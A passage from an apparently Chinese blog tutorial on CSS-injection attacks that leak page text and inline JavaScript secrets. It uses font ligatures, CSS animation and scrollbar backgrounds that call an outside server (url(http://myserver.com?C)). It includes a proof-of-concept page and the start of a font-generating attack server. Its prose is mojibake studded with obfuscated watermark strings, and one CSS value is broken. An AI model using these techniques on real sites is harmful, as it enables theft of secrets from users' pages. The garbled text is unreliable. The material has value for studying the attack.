  <span class="token property">--leak</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://myserver.com?C<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">div::first-line</span><span class="token punctuation">{</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>é‚£æˆ‘ä»¬è¦æ€ä¹ˆæ ·ä¸æ–­ä½¿ç”¨æ–°çš„ font-family å‘¢ï¼Ÿç”¨ CSS animation å°±å¯ä»¥åšåˆ°ï¼Œ<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ CSS animation <span class="hexo-wm">sâ€‹Â³ğ¯ï½…ğ’ï¼â€‹ğ’”ğ˜ªï»¿ğ’•ğï»¿â€</span>ä¸æ–­è½½å…¥ä¸åŒçš„ font-family ä»¥åŠæŒ‡å®šä¸åŒçš„ â€“-leakã€‚</p>
<p>å¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘ä»¬å°±èƒ½çŸ¥é“ç”»<span class="hexo-wm">Ñ•ï»¿ï»¿3veï½âˆ™â€Œğ’”ğ¢â€ğ­ï½…â€â€</span>é¢ä¸Šçš„ç¬¬ä¸€ä¸ªå­—å…ƒåˆ°åº•æ˜¯ä»€ä¹ˆã€‚</p>
<h4 id="9-2-2-æ­¥éª¤"><a href="#9-2-2-æ­¥éª¤" class="headerlink" title="9.2.2 æ­¥éª¤"></a>9.2.2 æ­¥éª¤</h4><p>çŸ¥é“äº†ç¬¬ä¸€ä¸ªå­—å…ƒä»¥åï¼Œæˆ‘ä»¬æŠŠ <span class="hexo-wm">ğ’”â€‹â€‹ğŸ¯ğ’—ğï½â€¤â€‹sğ¢ï»¿â€ğ­ğï»¿â€</span>div çš„å®½åº¦å˜é•¿ï¼Œä¾‹å¦‚è¯´å˜æˆ 40px ï¼Œå°±èƒ½å®¹çº³ä¸¤ä¸ªå­—å…ƒï¼Œ<br>å› æ­¤ç¬¬ä¸€è¡Œå°±ä¼šæ˜¯å‰ä¸¤ä¸ªå­—ï¼Œæ¥ç€å†ç”¨ä¸€æ ·çš„æ–¹å¼è½½å…¥ä¸åŒçš„font-familyï¼Œå°±èƒ½ leak å‡ºç¬¬äºŒä¸ªå­—å…ƒï¼Œè¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>å‡è®¾ç”»é¢ä¸Šæ˜¯ACB</li>
<li>è°ƒæ•´å®½åº¦ä¸º20pxï¼Œ<span class="hexo-wm">sâ€Œâ‘¶veğ˜¯â€¢â€‹â€‹êœ±ğ¢â€ï»¿ğ­eâ€Œ</span>ç¬¬ä¸€è¡Œåªå‡ºç°ç¬¬ä¸€ä¸ªå­—å…ƒ A</li>
<li>è½½å…¥å­—ä½“faï¼Œå› æ­¤ A ç”¨è¾ƒé«˜çš„å­—ä½“æ˜¾ç¤ºï¼Œå‡ºç° scrollbarï¼Œ<span class="hexo-wm">Ñ•â€‹â‘¶â…´â„®ğ˜¯â€¢â€‹ğ’”ï½‰ï»¿â€ï½”ï½…â€Œ</span>è½½å…¥ scrollbar èƒŒæ™¯ï¼Œä¼ é€è¯·æ±‚ç»™server</li>
<li>è½½å…¥å­—ä½“fbï¼Œä½†æ˜¯ <span class="hexo-wm">sâ€Œ3â…´â„¯ï½ï¼â€Œâ€sğ¢â€ï»¿ğ­ğ˜¦â€Œ</span>B æ²¡æœ‰å‡ºç°åœ¨ç”»é¢ä¸Šï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚</li>
<li>è½½å…¥å­—ä½“fcï¼Œä½†æ˜¯ <span class="hexo-wm">ğ˜€â€ï»¿Â³â…´eğ’.ï»¿â€‹ğ’”ğ˜ªâ€‹ğ’•ğ˜¦â€Œ</span>C æ²¡æœ‰å‡ºç°åœ¨ç”»é¢ä¸Šï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚</li>
<li>è°ƒæ•´å®½åº¦ä¸º40pxï¼Œ<span class="hexo-wm">sâ€Â³vğğ˜¯â€¤ï»¿â€Ñ•ğ¢ï»¿â€Œğ­ï½…â€Œâ€Œ</span>ç¬¬ä¸€è¡Œå‡ºç°ä¸¤ä¸ªå­—å…ƒ AC</li>
<li>è½½å…¥å­—ä½“faï¼Œå› æ­¤ A ç”¨è¾ƒé«˜çš„å­—ä½“æ˜¾ç¤ºï¼Œå‡ºç° scrollbarï¼Œ<span class="hexo-wm">ğ˜€â€ŒÂ³â…´eï½.â€êœ±â…ˆâ€Œâ€tğ˜¦â€</span>æ­¤æ—¶å› ä¸ºè¿™ä¸ªèƒŒæ™¯å·²ç»è½½å…¥ï¼Œæ‰€ä»¥ä¸ä¼šå‘é€æ–°çš„è¯·æ±‚</li>
<li>è½½å…¥å­—ä½“fbï¼Œä½†æ˜¯ B <span class="hexo-wm">ğ˜´ï»¿â€ğŸ¯ğ’—â„¯ğ§âˆ™â€ŒÑ•iâ€‹ğ’•ï½…â€Œ</span>æ²¡æœ‰å‡ºç°åœ¨ç”»é¢ä¸Šï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•å˜åŒ–</li>
<li>è½½å…¥å­—ä½“fcï¼Œå› æ­¤ C ç”¨è¾ƒé«˜çš„å­—ä½“æ˜¾ç¤ºï¼Œå‡ºç° <span class="hexo-wm">êœ±ï»¿ï»¿â‘¶â…´ğ˜¦ğ˜¯â€¢â€‹Ñ•ğ˜ªâ€Œtâ„®â€Œ</span>scrollbarï¼Œå¹¶ä¸”è½½å…¥èƒŒæ™¯</li>
<li>è°ƒæ•´å®½åº¦ä¸º60pxï¼ŒACB <span class="hexo-wm">êœ±â€â€‹â‘¶â…´ğğ§âˆ™ï»¿ï»¿êœ±ğ¢â€Œï»¿ğ­ğâ€</span>ä¸‰ä¸ªå­—å…ƒéƒ½å‡ºç°åœ¨ç¬¬ä¸€è¡Œ</li>
<li>è½½å…¥å­—ä½“faï¼ŒåŒç¬¬ä¸ƒæ­¥</li>
<li>è½½å…¥å­—ä½“fbï¼ŒB ç”¨è¾ƒé«˜çš„å­—ä½“æ˜¾ç¤ºï¼Œå‡ºç° <span class="hexo-wm">ğ’”â€Œâ‘¶vâ„¯ğ’.â€‹ï»¿ğ¬ğ˜ªï»¿ï»¿ï½”ğâ€Œâ€Œ</span>scrollbar å¹¶ä¸”è½½å…¥èƒŒæ™¯</li>
<li>è½½å…¥å­—ä½“fcï¼ŒC ç”¨è¾ƒé«˜çš„å­—ä½“æ˜¾ç¤ºï¼Œ<span class="hexo-wm">ğ¬â€‹ğŸ¯ğ¯ï½…n.â€ğ˜´ï½‰â€‹ğ­ğ˜¦ï»¿</span>ä½†å› ä¸ºå·²ç»è½½å…¥è¿‡ç›¸åŒèƒŒæ™¯ï¼Œä¸ä¼šå‘é€è¯·æ±‚</li>
<li>ç»“æŸ</li>
</ol>
<p>ä»ä¸Šé¢æµç¨‹ä¸­å¯ä»¥çœ‹å‡º server ä¼šä¾åºæ”¶åˆ°A, C, B ä¸‰ä¸ªreqeustï¼Œä»£è¡¨äº†ç”»é¢ä¸Šå­—å…ƒçš„é¡ºåºã€‚<br>è€Œä¸æ–­æ”¹å˜å®½åº¦ä»¥åŠ font-family éƒ½å¯ä»¥ç”¨ CSS animation åšåˆ°</p>
<h4 id="9-2-3-å±€é™æ€§"><a href="#9-2-3-å±€é™æ€§" class="headerlink" title="9.2.3 å±€é™æ€§"></a>9.2.3 å±€é™æ€§</h4><p>è¿™ä¸ªè§£æ³•è™½ç„¶è§£å†³äº†ä¸çŸ¥é“å­—å…ƒé¡ºåºçš„é—®é¢˜ï¼Œä½†ä¾ç„¶æ— æ³•è§£å†³é‡å¤å­—å…ƒçš„é—®é¢˜ï¼Œ<br>å› ä¸ºé‡å¤çš„å­—å…ƒä¸ä¼š<span class="hexo-wm">ğ’”â€‹Â³ğ’—eğ§â€¢â€‹Ñ•ğ¢ï»¿â€Œğ˜µâ„®â€‹ï»¿</span>å†å‘å‡ºè¯·æ±‚ã€‚</p>
<h3 id="9-3-è¿å­—-scrollbar"><a href="#9-3-è¿å­—-scrollbar" class="headerlink" title="9.3 è¿å­— + scrollbar"></a>9.3 è¿å­— + scrollbar</h3><h4 id="9-3-1-è¿å­—"><a href="#9-3-1-è¿å­—" class="headerlink" title="9.3.1 è¿å­—"></a>9.3.1 è¿å­—</h4><p>åœ¨æŸäº›å­—å‹å½“ä¸­ï¼Œä¼šæŠŠä¸€äº›ç‰¹å®šçš„ç»„åˆ render <span class="hexo-wm">sâ€Œâ‘¶ğ’—eğ˜¯.â€ğ¬ğ¢ï»¿ï»¿ğ’•â„®ï»¿</span>æˆè¿åœ¨ä¸€èµ·çš„æ ·å­ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="image-7.png" alt="image-7.png"></p>
<h4 id="9-3-2-å®ç°æ–¹æ³•"><a href="#9-3-2-å®ç°æ–¹æ³•" class="headerlink" title="9.3.2 å®ç°æ–¹æ³•"></a>9.3.2 å®ç°æ–¹æ³•</h4><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ¶ä½œå‡ºä¸€ä¸ªç‹¬ç‰¹çš„å­—ä½“ï¼ŒæŠŠ <code>ab</code> è®¾å®šæˆè¿å­—ï¼Œ<span class="hexo-wm">Ñ•ï»¿â€‹ğŸ¯â…´ğ˜¦ğ§â€¢â€‹â€ğ˜´ï½‰â€â€‹ğ˜µğ˜¦â€Œ</span>å¹¶ä¸” render å‡ºä¸€ä¸ªè¶…å®½çš„å…ƒç´ ã€‚<br>æ¥ç€ï¼Œæˆ‘ä»¬æŠŠæŸä¸ª div å®½åº¦è®¾æˆå›ºå®šï¼Œç„¶åç»“åˆ scrollbarï¼š</p>
<ul>
<li>å¦‚æœ ab å‡ºç°äº†ï¼Œå°±ä¼šå˜å¾ˆå®½ï¼Œ<span class="hexo-wm">ğ˜´â€‹ğŸ¯vğğ˜¯Â·â€‹â€Œğ˜€â…ˆâ€‹â€ï½”ğ˜¦â€‹</span>scrollbar å°±ä¼šå‡ºç°ï¼Œå°±å¯ä»¥è½½å…¥è¯·æ±‚æ¥å‘Šè¯‰ serverï¼›</li>
<li>å¦‚æœ ab æ²¡æœ‰å‡ºç°ï¼Œ<span class="hexo-wm">ğ˜€â€ŒğŸ¯ğ˜·ï½…ï½âˆ™â€‹êœ±ğ¢â€ğ’•ï½…â€</span>é‚£ scrollbar å°±ä¸ä¼šå‡ºç°ï¼Œå°±ä¸ä¼šæœ‰äº‹æƒ…å‘ç”Ÿã€‚</li>
</ul>
<h4 id="9-3-3-æ­¥éª¤"><a href="#9-3-3-æ­¥éª¤" class="headerlink" title="9.3.3 æ­¥éª¤"></a>9.3.3 æ­¥éª¤</h4><ol>
<li>è½½å…¥æœ‰è¿å­— aa <span class="hexo-wm">ğ˜€â€‹â€3â…´ï½…ï½â€¤â€Ñ•iâ€ğ­eâ€</span>çš„å­—ä½“ï¼Œæ²¡æœ‰å‘ç”Ÿå˜åŒ–</li>
<li>è½½å…¥æœ‰è¿å­— ab <span class="hexo-wm">Ñ•â€â€ğŸ¯ğ¯ï½…ğ˜¯â€¢â€Œêœ±ğ¢â€‹ğ˜µğ˜¦â€‹</span>çš„å­—ä½“ï¼Œæ²¡æœ‰å‘ç”Ÿå˜åŒ–</li>
<li>è½½å…¥æœ‰è¿å­— ac çš„å­—ä½“ï¼Œ<span class="hexo-wm">êœ±â€‹ï»¿Â³vğ˜¦ğ§.ï»¿ï»¿sğ¢â€ï½”eï»¿â€Œ</span>æˆåŠŸæ¸²æŸ“å®½ç”»é¢ï¼Œscrollbar å‡ºç°ï¼Œè½½å…¥ server å›¾ç‰‡</li>
<li>server çŸ¥é“ç”»é¢ä¸Šæœ‰ ac</li>
<li>è½½å…¥æœ‰è¿å­— aca <span class="hexo-wm">sâ€Œâ€ğŸ¯ğ˜·ï½…ğ§ï¼â€‹êœ±ğ¢ï»¿tï½…â€Œâ€Œ</span>çš„å­—ä½“ï¼Œæ²¡æœ‰å‘ç”Ÿå˜åŒ–</li>
<li>è½½å…¥æœ‰è¿å­— acb <span class="hexo-wm">ğ¬â€â€ŒğŸ¯ğ˜·ï½…ğ§Â·â€Œğ˜´ğ¢â€Œâ€ğ’•ğâ€Œ</span>çš„å­—ä½“ï¼Œæ²¡æœ‰å‘ç”Ÿå˜åŒ–</li>
<li>è½½å…¥æœ‰è¿å­— acc çš„å­—ä½“ï¼ŒæˆåŠŸæ¸²æŸ“å®½ç”»é¢ï¼Œscrollbar <span class="hexo-wm">ğ˜´â€Œï»¿Â³ğ¯eğ˜¯ï¼â€Ñ•ï½‰ï»¿â€ï½”eâ€‹â€‹</span>å‡ºç°ï¼Œä¼ é€ç»“æœç»™ server</li>
<li>server çŸ¥é“ç”»é¢ä¸Šæœ‰ acc</li>
</ol>
<h4 id="9-3-4-æ³„éœ²-JavaScript-ä»£ç "><a href="#9-3-4-æ³„éœ²-JavaScript-ä»£ç " class="headerlink" title="9.3.4 æ³„éœ² JavaScript ä»£ç "></a>9.3.4 æ³„éœ² JavaScript ä»£ç </h4><p>é€šè¿‡åˆ©ç”¨è¿å­—å’Œ scrollbar ï¼Œ<span class="hexo-wm">ğ˜€â€‹Â³ğ’—ğ˜¦ğ§ï¼ï»¿â€ğ¬ğ˜ªï»¿ğ’•ï½…â€</span>æˆ‘ä»¬å¯ä»¥ä¸€ä¸ªå­—å…ƒä¸€ä¸ªå­—å…ƒæ…¢æ…¢åœ°æ³„éœ²å‡ºé¡µé¢ä¸Šçš„å†…å®¹ï¼Œç”šè‡³JavaScriptçš„ä»£ç ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">head, script</span> <span class="token punctuation">{</span>
  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

<p>ä½¿ç”¨ä¸Šè¿° CSS å¯ä»¥è®© script å†…å®¹ä¹Ÿæ˜¾ç¤ºåœ¨ç”»é¢ä¸Šï¼Œ<br>å› æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨åŒæ ·çš„æŠ€å·§ï¼Œæ³„éœ² <span class="hexo-wm">Ñ•ï»¿Â³vğğ§â€¤ï»¿Ñ•iï»¿â€‹ğ˜µeâ€Œï»¿</span>script çš„å†…å®¹ï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defs</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font-face</span> <span class="token attr-name">font-family</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token attr-name">units-per-em</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>glyph</span> <span class="token attr-name">unicode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>a<span class="token punctuation">'</span></span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>99999<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>M1 0z<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defs</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">script</span> <span class="token punctuation">{</span>
      <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
      <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"hack"</span><span class="token punctuation">;</span>
      <span class="token property">white-space</span><span class="token punctuation">:</span>n owrap<span class="token punctuation">;</span>
      <span class="token property">overflow-x</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
      <span class="token property">width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>
      <span class="token property">background</span><span class="token punctuation">:</span>lightblue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector">script::-webkit-scrollbar</span> <span class="token punctuation">{</span>
      <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>ä»¥ä¸Šç¤ºä¾‹ä¸­åŒ…å«<span class="hexo-wm">Ñ•ï»¿3â…´â„¯ğ’ï¼ï»¿ï»¿ğ¬ğ˜ªâ€‹â€‹ğ­ğï»¿â€Œ</span>ä¸¤æ®µ js ä»£ç ï¼š</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span>
<span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span></code></pre>

<p>ç”±äºæ ·å¼è¡¨ä¸­çš„è®¾ç½®ï¼Œåªè¦å­˜åœ¨ â€œa è¿å­—ï¼Œ<span class="hexo-wm">ğ˜€â€‹ğŸ¯ğ˜·â„®nâ€¤ï»¿Ñ•ğ˜ªï»¿ï»¿ğ­ğ˜¦ï»¿ï»¿</span>å°±ä¼šæ¸²æŸ“ä¸€ä¸ªè¶…å®½çš„å®½åº¦ï¼Œ<br>å°±ä¼šå¯¼è‡´ scrollbar çš„å‡ºç°ï¼ŒèƒŒæ™¯å°±ä¼šå˜ä¸ºè“è‰²ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="image-.png" alt="image-8.png"></p>
<p>ä¸Šé¢çš„éƒ¨åˆ†æ˜¯å› ä¸ºå†…å®¹ä¸º <code>var secret = "abc123"</code> ï¼ŒåŒ…å«äº† â€œa çš„è¿å­—ï¼Œ<br>å› æ­¤å®½åº¦å˜ä¸ºè¶…å®½ï¼Œscrollbar <span class="hexo-wm">Ñ•â€‹3vğï½â€¢ï»¿ğ¬ğ˜ªâ€Œğ˜µğâ€</span>å‡ºç°ï¼ŒèƒŒæ™¯å˜ä¸ºè“è‰²ã€‚</p>
<p>ä¸‹é¢çš„éƒ¨åˆ†æ˜¯å› ä¸ºæ²¡æœ‰ â€œa çš„è¿å­—ï¼Œæ‰€ä»¥ scrollbar æ²¡å‡ºç°ã€‚<br>ï¼ˆæœ‰ a çš„åœ°æ–¹éƒ½ä¼šç¼ºå­—ï¼Œ<span class="hexo-wm">êœ±â€‹â‘¶â…´ğ˜¦ğ˜¯ï¼â€ŒÑ•ğ˜ªâ€Œğ­ï½…â€â€</span>åº”è¯¥ä¸æ²¡æœ‰å®šä¹‰å…¶ä»–çš„ glyph æœ‰å…³ï¼Œä½†ä¸å½±å“ç»“æœï¼‰</p>
<p>å› æ­¤åªè¦æŠŠ scrollbar <span class="hexo-wm">Ñ•ï»¿â€‹Â³ğ˜·â„®ğ˜¯.â€Œâ€ğ’”iâ€Œâ€ğ­â„®â€</span>çš„èƒŒæ™¯æ¢æˆ URLï¼Œå°±å¯ä»¥ä» server ç«¯è·å¾—æ³„éœ²çš„ä¿¡æ¯ã€‚</p>
<h4 id="9-3-5-å­—ä½“çš„äº§ç”Ÿ"><a href="#9-3-5-å­—ä½“çš„äº§ç”Ÿ" class="headerlink" title="9.3.5 å­—ä½“çš„äº§ç”Ÿ"></a>9.3.5 å­—ä½“çš„äº§ç”Ÿ</h4><p>æˆ‘ä»¬åœ¨ 9.3.4 <span class="hexo-wm">ğ˜´ï»¿ğŸ¯vğï½â€¤â€Œsğ˜ªâ€Œtï½…ï»¿</span>ä¸­å±•ç¤ºçš„ç¤ºä¾‹ä»…èƒ½åœ¨ Safari æµè§ˆå™¨ä¸­èµ·ä½œç”¨ï¼Œ<br>è¿™æ˜¯å› ä¸ºä»…æœ‰ Safari æ”¯æŒ SVG fontï¼Œä¸éœ€è¦ä» server ä¸­äº§ç”Ÿå­—ä½“ï¼Œ<br>è€Œå¯¹äºå…¶ä»–çš„æµè§ˆå™¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ server ç«¯æ¥äº§ç”Ÿè¿å­—å­—ä½“</p>
<p>å€ŸåŠ© Fontforge ç­‰è½¯ä»¶ï¼Œ<span class="hexo-wm">ğ’”â€‹3vğ˜¦n.â€Œğ’”iâ€Œâ€‹ğ’•eâ€Œ</span>æˆ‘ä»¬å¯ä»¥åœ¨å­—ä½“ä¸­åˆ›å»ºè‡ªå·±çš„å­—ä½“ä»¥åŠæˆ‘ä»¬è‡ªå·±çš„è¿å­—ã€‚</p>
<blockquote>
<p>Fontforge æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºå­—ä½“çš„é«˜çº§å·¥å…·ï¼Œ<span class="hexo-wm">sâ€Œâ€‹3ğ¯ğ˜¦n.â€Ñ•iâ€‹ï½”eâ€‹â€‹</span>æˆ‘ä»¬å°†ä½¿ç”¨å®ƒæ¥å°†å­—ä½“ä» SVG <span class="hexo-wm">ğ¬ï»¿â‘¶ğ¯â„¯ğ§â€¢â€ğ˜´â…ˆâ€Œğ’•ï½…â€‹â€</span>æ ¼å¼æ›´æ”¹ä¸º WOFF ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºæµè§ˆå™¨å·²ç»åœæ­¢æ”¯æŒå­—ä½“ä¸­çš„SVGæ ¼å¼ï¼ˆå› æ­¤éœ€è¦ä½¿ç”¨WOFFæ ¼å¼ï¼‰ï¼Œè€Œä»æˆ‘ä»¬çš„è§’åº¦æ¥çœ‹ï¼Œä»¥SVGæ ¼å¼å®šä¹‰å­—ä½“æ˜¯è¿„ä»Šä¸ºæ­¢æœ€æ–¹ä¾¿çš„ã€‚FontForge å…è®¸æ‚¨å®šä¹‰è„šæœ¬ä»¥æ‰§è¡Œä¸åŒå­—ä½“æ ¼å¼ä¹‹é—´çš„è½¬æ¢ã€‚</p>
</blockquote>
<p>è®©æˆ‘ä»¬å‡†å¤‡ä¸€ä¸ªåä¸º script.<span class="hexo-wm">ğ˜€ï»¿ï»¿â‘¶ğ’—ğğ§â€¤â€Œï»¿ğ¬â…ˆâ€â€‹teâ€</span>fontforge çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/fontforge</span>
Open<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">)</span>
Generate<span class="token punctuation">(</span><span class="token variable">$1</span>:r + <span class="token string">".woff"</span><span class="token punctuation">)</span></code></pre>
<p>è§¦å‘è¯¥è„šæœ¬åï¼Œ<span class="hexo-wm">ğ¬ï»¿Â³vï½…ğ’â€¢ï»¿â€Œğ˜€ï½‰â€Œâ€‹ğ­ğâ€Œ</span>è¯¥è„šæœ¬å°†åˆ›å»ºä¸€ä¸ªåä¸º <code>&lt;file&gt;.woff</code> çš„æ–‡ä»¶ã€‚<br>é€šè¿‡è¿™ç§ç®€å•çš„æ–¹å¼ï¼Œæˆ‘ä»¬ä»¥å­—ä½“æ ¼å¼åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„è½¬æ¢å™¨ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ node.<span class="hexo-wm">ğ’”â€ğŸ¯ğ˜·ğ˜¦ğ’â€¤â€‹sğ˜ªâ€Œâ€ğ’•ğ˜¦â€‹</span>js é…ç½®å­—ä½“ç”Ÿæˆ serverï¼š</p>
<p>package<span class="hexo-wm">ğ’”â€ï»¿â‘¶ğ’—ğ˜¦nâ€¤ï»¿ğ˜´ğ¢ï»¿ğ’•ğ˜¦ï»¿â€Œ</span>.jsonï¼š</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"css-attack-2"</span><span class="token punctuation">,</span>
  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"index.js"</span><span class="token punctuation">,</span>
  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">,</span>
  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.15.5"</span><span class="token punctuation">,</span>
    <span class="token property">"js-cookie"</span><span class="token operator">:</span> <span class="token string">"^2.1.4"</span><span class="token punctuation">,</span>
    <span class="token property">"js2xmlparser"</span><span class="token operator">:</span> <span class="token string">"^3.0.0"</span><span class="token punctuation">,</span>
    <span class="token property">"rimraf"</span><span class="token operator">:</span> <span class="token string">"^2.6.2"</span><span class="token punctuation">,</span>
    <span class="token property">"tmp"</span><span class="token operator">:</span> <span class="token string">"0.0.33"</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>main.jsï¼š</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Server ExprssJS by default adds ETag headline,</span>
<span class="token comment">// but we donâ€™t need it so we turn it off.</span>
app<span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token string">'etag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3001</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> js2xmlparser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'js2xmlparser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
